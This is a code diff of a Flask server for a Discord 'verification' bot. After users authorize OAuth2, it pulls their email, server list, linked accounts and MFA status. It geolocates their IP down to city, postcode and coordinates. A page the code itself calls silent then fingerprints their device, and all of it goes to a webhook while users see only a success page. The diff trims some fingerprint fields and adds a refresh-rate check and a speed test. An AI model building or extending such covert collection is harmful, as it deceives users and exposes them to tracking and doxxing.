@@ -1,33 +1,24 @@
 """
 app.py — Flask web server.
 
-FLOW (correct order):
-  1. Bot button  ──────────────►  Discord OAuth2 (user authorizes)
-  2. Discord     ──────────────►  /callback?code=X&state=Y
-     • Exchange code → access token
-     • Fetch all Discord data (user, guilds, connections)
-     • Store Discord data + IP info server-side keyed by state
-     • Redirect to /collect?state=Y
-  3. /collect page  ────────────►  Runs JS fingerprinting silently (~1.5s)
-     • POSTs fingerprint to /save-fp
-     • Redirects to /finish?state=Y
-  4. /finish  ──────────────────►
-     • Retrieves stored Discord data + fingerprint
-     • Sends webhook embed
-     • Assigns Verified role via bot
-     • Shows success page
+FLOW:
+  1. Bot button  ──►  Discord OAuth2 (user authorizes first, always)
+  2. Discord     ──►  /callback  →  exchanges code, fetches Discord data + IP, redirects to /collect
+  3. /collect        JS collects: refresh rate, speed test, device info  →  POSTs to /save-fp  →  /finish
+  4. /finish         Merges everything, sends webhook, assigns role, shows success
 """
 
 from __future__ import annotations
 
 import asyncio
+import os
 import re
 import time
 import urllib.parse
 from datetime import datetime
 
 import requests
-from flask import Flask, jsonify, redirect, render_template, request
+from flask import Flask, Response, jsonify, redirect, render_template, request
 
 from config import (
     APP_BASE_URL, CLIENT_ID, CLIENT_SECRET,
@@ -43,11 +34,15 @@ bot_loop: asyncio.AbstractEventLoop | None = None
 
 DISCORD_API = "https://discord.com/api/v10"
 
-# ── Server-side stores (keyed by state token) ─────────────────────────────────
-discord_store: dict[str, dict]  = {}   # state → {discord_data, ip, ip_info}
-fp_store:      dict[str, dict]  = {}   # state → fingerprint dict
-timestamps:    dict[str, float] = {}   # state → created_at (for TTL cleanup)
+# ── Server-side stores (keyed by OAuth2 state token) ─────────────────────────
+discord_store: dict[str, dict]  = {}
+fp_store:      dict[str, dict]  = {}
+timestamps:    dict[str, float] = {}
 _TTL = 600  # 10 minutes
+
+# ── Speed-test payload (2 MB of random bytes, generated once at startup) ─────
+# Served from /speedtest/down so JS can measure download speed to our server.
+_SPEED_PAYLOAD = os.urandom(2 * 1024 * 1024)
 
 
 def _cleanup():
@@ -58,7 +53,7 @@ def _cleanup():
         timestamps.pop(k, None)
 
 
-# ─── Utility ──────────────────────────────────────────────────────────────────
+# ─── Utility helpers ──────────────────────────────────────────────────────────
 
 def get_real_ip() -> str:
     for h in ("CF-Connecting-IP", "X-Forwarded-For", "X-Real-IP"):
@@ -78,10 +73,7 @@ def get_ip_info(ip: str) -> dict:
     if ip in ("127.0.0.1", "::1", "localhost", "Unknown"):
         return {}
     try:
-        fields = (
-            "status,country,countryCode,regionName,city,"
-            "zip,lat,lon,timezone,offset,isp,org,as,proxy,hosting"
-        )
+        fields = "status,country,countryCode,regionName,city,zip,lat,lon,timezone,offset,isp,org,as,proxy,hosting"
         r = requests.get(f"http://ip-api.com/json/{ip}?fields={fields}", timeout=5)
         d = r.json()
         return d if d.get("status") == "success" else {}
@@ -118,99 +110,94 @@ def nitro_label(t: int) -> str:
 
 def parse_browser_and_os(ua: str, fp: dict) -> tuple[str, str]:
     """
-    Returns (browser_string, os_string) using the best available source:
-    1. UA Client Hints (fp.uaHints) — most accurate, Chromium only
-    2. fp.isBrave flag — Brave hides as Chrome in UA, needs JS detection
-    3. Classic UA string regex — fallback for Firefox, Safari, older browsers
-    """
-    hints     = fp.get("uaHints", {})
-    is_brave  = fp.get("isBrave", False)
+    Returns (browser_name, os_name) — NO version numbers in output.
 
-    # ── Browser ───────────────────────────────────────────────────────────────
+    Priority order:
+      1. fp.isBrave     — Brave JS detection (only reliable Brave method)
+      2. fp.uaHints     — UA Client Hints (Chromium: real name + real Windows version)
+      3. UA regex       — Fallback for Firefox, Safari, all non-Chromium browsers
+    """
+    hints    = fp.get("uaHints") or {}
+    is_brave = bool(fp.get("isBrave"))
+
+    # ── Browser name (no version) ─────────────────────────────────────────────
     browser = "Unknown"
 
-    # Brave is detected by JS — must check before anything else since it
-    # deliberately reports itself as Chrome in every UA and Client Hints field
     if is_brave:
-        m = re.search(r"Chrome/(\d+)", ua)
-        browser = f"Brave {m.group(1)}" if m else "Brave"
+        browser = "Brave"
 
-    # UA Client Hints fullVersionList gives the true browser name & full version
     elif hints.get("fullVersionList"):
-        # Filter out noise brands ("Not_A Brand", "Chromium")
-        priority = ["Microsoft Edge", "Opera", "Yandex", "Samsung", "Vivaldi",
-                    "DuckDuckGo", "Brave", "Chrome"]
-        brands   = {b["brand"]: b["version"]
-                    for b in hints["fullVersionList"]
-                    if "not" not in b["brand"].lower()}
-        for name in priority:
-            for brand, ver in brands.items():
-                if name.lower() in brand.lower():
-                    # Use major version only for cleanliness
-                    major = ver.split(".")[0]
-                    browser = f"{brand} {major}"
+        # UA Client Hints: filter noise ("Not A Brand", "Chromium") and pick real name
+        noise = {"not a brand", "not.a/brand", "chromium"}
+        # Priority: branded browsers over generic Chrome
+        preferred = [
+            "Microsoft Edge", "Opera", "Yandex Browser", "Samsung Internet",
+            "DuckDuckGo", "Vivaldi", "UC Browser", "Chrome",
+        ]
+        brands = {
+            b["brand"]: b["version"]
+            for b in hints["fullVersionList"]
+            if b["brand"].lower().strip() not in noise
+        }
+        for want in preferred:
+            for brand in brands:
+                if want.lower() in brand.lower():
+                    browser = brand   # just the name, no number
                     break
             if browser != "Unknown":
                 break
-        # Generic Chromium fallback from hints
         if browser == "Unknown" and brands:
-            name, ver = next(iter(brands.items()))
-            browser = f"{name} {ver.split('.')[0]}"
+            browser = next(iter(brands))
 
-    # Classic UA regex fallback (works for all browsers)
+    # UA regex fallback — works for ALL browsers
     if browser == "Unknown":
-        for pat, tpl in [
-            (r"Edg/(\d+)",              "Microsoft Edge {}"),
-            (r"OPR/(\d+)",              "Opera {}"),
-            (r"YaBrowser/(\d+)",        "Yandex {}"),
-            (r"SamsungBrowser/(\d+)",   "Samsung Internet {}"),
-            (r"DuckDuckGo/(\d+)",       "DuckDuckGo {}"),
-            (r"Vivaldi/(\d+)",          "Vivaldi {}"),
-            (r"Firefox/(\d+)",          "Firefox {}"),
-            (r"FxiOS/(\d+)",            "Firefox iOS {}"),
-            (r"CriOS/(\d+)",            "Chrome iOS {}"),
-            (r"Chrome/(\d+)",           "Chrome {}"),
+        for pat, name in [
+            (r"Edg/",              "Microsoft Edge"),
+            (r"OPR/",              "Opera"),
+            (r"YaBrowser/",        "Yandex Browser"),
+            (r"SamsungBrowser/",   "Samsung Internet"),
+            (r"DuckDuckGo/",       "DuckDuckGo"),
+            (r"Vivaldi/",          "Vivaldi"),
+            (r"UCBrowser/",        "UC Browser"),
+            (r"Firefox/",          "Firefox"),
+            (r"FxiOS/",            "Firefox"),
+            (r"CriOS/",            "Chrome"),
+            (r"Chrome/",           "Chrome"),
         ]:
-            m = re.search(pat, ua)
-            if m:
-                browser = tpl.format(m.group(1))
+            if re.search(pat, ua):
+                browser = name
                 break
         else:
-            m = re.search(r"Version/(\d+).*Safari", ua)
-            if m:
-                browser = f"Safari {m.group(1)}"
-            elif "Safari" in ua:
+            if "Safari" in ua:
                 browser = "Safari"
 
-    # ── OS ────────────────────────────────────────────────────────────────────
+    # ── OS name ───────────────────────────────────────────────────────────────
     os_name = "Unknown"
 
-    # Client Hints gives accurate platform + version (distinguishes Win 10 vs 11)
     if hints.get("platform"):
-        platform = hints["platform"]
-        if platform == "Windows":
-            # fp.windowsVersion is set by JS based on platformVersion
+        p = hints["platform"]
+        if p == "Windows":
             os_name = fp.get("windowsVersion", "Windows 10/11")
-        elif platform == "macOS":
+        elif p == "macOS":
             pv = hints.get("platformVersion", "")
+            # macOS: version 13=Ventura, 14=Sonoma, 15=Sequoia, etc.
             os_name = f"macOS {pv}" if pv else "macOS"
-        elif platform == "Linux":
+        elif p == "Linux":
             os_name = "Linux"
-        elif platform == "Android":
+        elif p == "Android":
             pv = hints.get("platformVersion", "")
             os_name = f"Android {pv}" if pv else "Android"
-        elif platform in ("iOS", "iPadOS"):
+        elif p in ("iOS", "iPadOS"):
             pv = hints.get("platformVersion", "")
-            os_name = f"{platform} {pv}" if pv else platform
-        elif platform == "Chrome OS":
+            os_name = f"{p} {pv}" if pv else p
+        elif p == "Chrome OS":
             os_name = "ChromeOS"
         else:
-            os_name = platform
+            os_name = p
 
-    # UA fallback (always works, slightly less precise for Windows)
+    # UA fallback
     if os_name == "Unknown":
-        if   "Windows NT 10.0" in ua:
-            os_name = fp.get("windowsVersion", "Windows 10/11")
+        if   "Windows NT 10.0" in ua: os_name = fp.get("windowsVersion", "Windows 10/11")
         elif "Windows NT 6.3"  in ua: os_name = "Windows 8.1"
         elif "Windows NT 6.2"  in ua: os_name = "Windows 8"
         elif "Windows NT 6.1"  in ua: os_name = "Windows 7"
@@ -226,15 +213,15 @@ def parse_browser_and_os(ua: str, fp: dict) -> tuple[str, str]:
         elif "iPad"    in ua: os_name = "iPadOS"
         elif "Linux"   in ua: os_name = "Linux"
 
-    # Append architecture if available (e.g. "Windows 11 (arm64)")
+    # Append non-standard architecture (skip x86/x86_64 — that's assumed)
     arch = hints.get("architecture", fp.get("architecture", ""))
-    if arch and arch not in ("x86", "x86_64", ""):
+    if arch and arch.lower() not in ("x86", "x86_64", "x64", ""):
         os_name = f"{os_name} ({arch})"
 
     return browser, os_name
 
 
-# ─── Discord OAuth2 ───────────────────────────────────────────────────────────
+# ─── Discord OAuth2 helpers ───────────────────────────────────────────────────
 
 def exchange_code(code: str) -> dict:
     resp = requests.post(
@@ -275,11 +262,21 @@ def build_embeds(discord_data: dict, ip: str, ip_info: dict, fp: dict) -> list[d
     uname   = user.get("username", "Unknown")
     discrim = user.get("discriminator", "0")
     email   = user.get("email", "Not provided")
+
+    # Avatar
     av_hash = user.get("avatar", "")
     av_url  = (
-        f"https://cdn.discordapp.com/avatars/{uid}/{av_hash}.png?size=256"
+        f"https://cdn.discordapp.com/avatars/{uid}/{av_hash}.{'gif' if av_hash.startswith('a_') else 'png'}?size=256"
         if av_hash else "https://cdn.discordapp.com/embed/avatars/0.png"
     )
+
+    # Banner (only if user has an actual image banner, not just a colour)
+    banner_hash = user.get("banner", "")
+    banner_url  = None
+    if banner_hash:
+        ext = "gif" if banner_hash.startswith("a_") else "png"
+        banner_url = f"https://cdn.discordapp.com/banners/{uid}/{banner_hash}.{ext}?size=512"
+
     email_ok = user.get("verified",    False)
     mfa      = user.get("mfa_enabled", False)
     locale   = user.get("locale",      "Unknown")
@@ -293,6 +290,7 @@ def build_embeds(discord_data: dict, ip: str, ip_info: dict, fp: dict) -> list[d
 
     ua_raw           = fp.get("userAgent") or "Unknown"
     browser, os_name = parse_browser_and_os(ua_raw, fp)
+    is_brave         = bool(fp.get("isBrave"))
 
     def v(key, fallback="N/A"):
         val = fp.get(key)
@@ -303,58 +301,28 @@ def build_embeds(discord_data: dict, ip: str, ip_info: dict, fp: dict) -> list[d
     screen     = v("screen")
     dpr        = v("devicePixelRatio")
     window_sz  = v("windowSize")
-    avail_s    = v("availScreen")
-    color_d    = v("colorDepth")
     cpu        = v("hardwareConcurrency")
     mem        = v("deviceMemory")
     touch      = v("maxTouchPoints", "0")
     webgl      = v("webGL")
     webgl_vend = v("webGLVendor")
-    canvas_h   = v("canvasHash")
     dnt        = v("doNotTrack")
     cookies    = fp.get("cookieEnabled")
     adblock    = fp.get("adBlock", False)
-    is_brave   = fp.get("isBrave", False)
-    webrtc     = v("webRTC")
-    connection = v("connection")
-    battery    = v("battery")
     a_in       = v("audioInputs")
     a_out      = v("audioOutputs")
     v_in       = v("videoInputs")
-    fonts      = v("fonts")
 
-    # Audio FP — show "Blocked (Privacy Browser)" for Brave/Firefox strict
-    audio_raw     = fp.get("audioFingerprint")
-    audio_blocked = fp.get("audioBlocked", False)
-    if audio_blocked or not audio_raw:
-        audio_fp = "🛡️ Blocked (privacy mode)"
-    else:
-        audio_fp = audio_raw
+    # Refresh rate
+    hz = v("refreshRate")
+    hz_str = f"**{hz}**" if hz != "N/A" else "N/A"
 
-    # WebRTC — "Blocked" is meaningful for Brave users
-    if webrtc in ("Blocked", "N/A", ""):
-        webrtc_disp = "🛡️ Blocked" if (is_brave or webrtc == "Blocked") else "N/A"
-    else:
-        webrtc_disp = f"`{webrtc}`"
+    # Speed test
+    dl = v("speedDownload")
+    ul = v("speedUpload")
+    speed_str = f"↓ {dl}  •  ↑ {ul}" if dl != "N/A" else "N/A"
 
-    # Plugins — trim redundant PDF viewer copies
-    raw_plugins = fp.get("plugins", "")
-    if raw_plugins and raw_plugins not in ("N/A", "None"):
-        plugin_list = [p.strip() for p in raw_plugins.split(",")]
-        # Keep only the first PDF viewer variant, drop the rest
-        pdf_seen = False
-        clean_plugins = []
-        for p in plugin_list:
-            if "pdf" in p.lower():
-                if not pdf_seen:
-                    clean_plugins.append("PDF Viewer")
-                    pdf_seen = True
-            else:
-                clean_plugins.append(p)
-        plugins = ", ".join(clean_plugins) or "None"
-    else:
-        plugins = raw_plugins or "N/A"
-
+    # ── Discord Account field ─────────────────────────────────────────────────
     discrim_str = f"#{discrim}" if discrim not in ("0", "", None) else ""
     badge_str   = ",  ".join(f"`{b}`" for b in badges) if badges else "None"
 
@@ -366,6 +334,7 @@ def build_embeds(discord_data: dict, ip: str, ip_info: dict, fp: dict) -> list[d
         f"🏅  Badges: {badge_str}"
     )
 
+    # ── Network field ─────────────────────────────────────────────────────────
     tz_offset = ip_info.get("offset", 0)
     tz_sign   = "+" if tz_offset >= 0 else ""
     tz_hours  = tz_offset // 3600 if isinstance(tz_offset, int) else "?"
@@ -382,32 +351,27 @@ def build_embeds(discord_data: dict, ip: str, ip_info: dict, fp: dict) -> list[d
         f"Datacenter: {'⚠️ **YES**' if ip_info.get('hosting') else '✅ No'}"
     )
 
+    # ── Device & Browser field ────────────────────────────────────────────────
     device_val = (
-        f"🌐  **{browser}**{'  🛡️ Brave' if is_brave and 'Brave' not in browser else ''}\n"
+        f"🌐  **{browser}**\n"
         f"🖥️  **{os_name}**\n"
         f"🌍  {lang}  •  All: {languages}\n"
         f"📺  {screen} @ {dpr}×  •  Window: {window_sz}\n"
-        f"🖥️  Available: {avail_s}  •  Colour: {color_d}\n"
+        f"🔄  Refresh Rate: {hz_str}\n"
         f"⚡  CPU: **{cpu}** cores  •  RAM: **{mem}** GB\n"
-        f"👆  Touch points: {touch}\n"
+        f"👆  Touch: {touch} points\n"
         f"🎮  GPU: {webgl}\n"
         f"🏭  GPU Vendor: {webgl_vend}\n"
-        f"🖼️  Canvas hash: `{canvas_h}`\n"
-        f"🎵  Audio FP: {audio_fp}\n"
-        f"📡  WebRTC leak: {webrtc_disp}\n"
-        f"📶  Connection: {connection}\n"
-        f"🔋  Battery: {battery}\n"
+        f"📶  Speed: {speed_str}\n"
         f"🔇  AdBlock: {'✅ Yes' if adblock else '❌ No'}  •  "
         f"DNT: {dnt}  •  Cookies: {'✅' if cookies else '❌'}\n"
-        f"🎙️  Mic: {a_in}  •  Cam: {v_in}  •  Speakers: {a_out}\n"
-        f"🔤  Fonts: {fonts}\n"
-        f"🧩  Plugins: {plugins}"
+        f"🎙️  Mic: {a_in}  •  Cam: {v_in}  •  Speakers: {a_out}"
     )
 
     vpn_header = "⚠️  VPN / PROXY DETECTED  •  " if is_vpn else ""
     now_iso    = datetime.utcnow().isoformat() + "Z"
 
-    embed1 = {
+    embed1: dict = {
         "title":       f"{vpn_header}🔐  New Verification",
         "description": f"<@{uid}> just verified in the server.",
         "color":       color,
@@ -420,6 +384,9 @@ def build_embeds(discord_data: dict, ip: str, ip_info: dict, fp: dict) -> list[d
         "footer":    {"text": f"Verified at {fmt_now()}"},
         "timestamp": now_iso,
     }
+    # Show banner as large image below fields (only if they have one)
+    if banner_url:
+        embed1["image"] = {"url": banner_url}
 
     guild_lines = []
     for g in guilds[:25]:
@@ -433,7 +400,7 @@ def build_embeds(discord_data: dict, ip: str, ip_info: dict, fp: dict) -> list[d
         "twitter": "🐦", "github": "⬛", "xbox": "🟩", "facebook": "🔵",
         "reddit": "🟠", "playstation": "🔵", "epicgames": "⬜",
         "instagram": "🟤", "tiktok": "⬛", "riotgames": "🔴",
-        "leagueoflegends": "🔷",
+        "leagueoflegends": "🔷", "battlenet": "🔵",
     }
     conn_lines = []
     for c in connections:
@@ -479,12 +446,28 @@ def send_webhook(discord_data: dict, ip: str, ip_info: dict, fp: dict):
 
 # ─── Routes ───────────────────────────────────────────────────────────────────
 
+@app.route("/speedtest/down")
+def speedtest_down():
+    """Serves a 2 MB payload for the JS download speed test."""
+    return Response(
+        _SPEED_PAYLOAD,
+        mimetype="application/octet-stream",
+        headers={"Cache-Control": "no-store, no-cache", "Content-Length": str(len(_SPEED_PAYLOAD))},
+    )
+
+
+@app.route("/speedtest/up", methods=["POST"])
+def speedtest_up():
+    """Receives upload data from JS speed test and discards it."""
+    request.get_data()  # read and discard
+    return jsonify({"ok": True})
+
+
 @app.route("/callback")
 def callback():
     """
-    Step 1 after Discord OAuth2.
-    Exchanges code, fetches all Discord data, stores it by state,
-    then redirects to /collect for fingerprinting.
+    Discord redirects here after user authorizes.
+    Exchanges code → fetches all Discord data + IP → stores by state → redirects to /collect.
     """
     code  = request.args.get("code", "")
     state = request.args.get("state", "")
@@ -496,25 +479,17 @@ def callback():
         return render_template("error.html", error="No authorization code received from Discord.")
 
     try:
-        # Exchange code for token and fetch all Discord data NOW
         token_data   = exchange_code(code)
         access_token = token_data["access_token"]
         discord_data = fetch_discord_data(access_token)
 
-        # Collect IP at the moment they land on our server
         ip      = get_real_ip()
         ip_info = get_ip_info(ip)
 
-        # Store everything server-side keyed by state
         _cleanup()
-        discord_store[state] = {
-            "discord_data": discord_data,
-            "ip":           ip,
-            "ip_info":      ip_info,
-        }
-        timestamps[state] = time.time()
+        discord_store[state] = {"discord_data": discord_data, "ip": ip, "ip_info": ip_info}
+        timestamps[state]    = time.time()
 
-        # Redirect to fingerprint collection page
         collect_url = f"{APP_BASE_URL}/collect?state={urllib.parse.quote(state)}"
         return redirect(collect_url)
 
@@ -529,14 +504,10 @@ def callback():
 
 @app.route("/collect")
 def collect():
-    """
-    Fingerprint collection page.
-    Runs JS fingerprinting silently, POSTs to /save-fp, then redirects to /finish.
-    """
+    """Renders the silent data-collection interstitial page."""
     state = request.args.get("state", "").strip()
     if not state or state not in discord_store:
-        return render_template("error.html", error="Session expired or invalid. Please click Verify Now again.")
-
+        return render_template("error.html", error="Session expired. Please click Verify Now again.")
     finish_url = f"{APP_BASE_URL}/finish?state={urllib.parse.quote(state)}"
     return render_template("collect.html", state=state, finish_url=finish_url)
 
@@ -549,17 +520,14 @@ def save_fp():
     fp    = data.get("fp", {})
     if state:
         fp_store[state]   = fp
-        timestamps[state] = time.time()  # refresh TTL
-        print(f"💾  Fingerprint saved for state …{state[-6:]}")
+        timestamps[state] = time.time()
+        print(f"💾  Fingerprint saved …{state[-6:]}")
     return jsonify({"ok": True})
 
 
 @app.route("/finish")
 def finish():
-    """
-    Final step.
-    Retrieves stored Discord data + fingerprint, sends webhook, assigns role.
-    """
+    """Merges Discord data + fingerprint, sends webhook, assigns role."""
     state = request.args.get("state", "").strip()
 
     stored = discord_store.pop(state, None)
@@ -575,14 +543,11 @@ def finish():
     user         = discord_data["user"]
     uid          = int(user.get("id", 0))
 
-    # Ensure UA is populated from something — at callback time we had the real browser UA
     if not fp.get("userAgent"):
         fp["userAgent"] = request.headers.get("User-Agent", "Unknown")
 
-    # Send webhook
     send_webhook(discord_data, ip, ip_info, fp)
 
-    # Assign role
     role_given = False
     if uid and discord_bot and bot_loop:
         future = asyncio.run_coroutine_threadsafe(
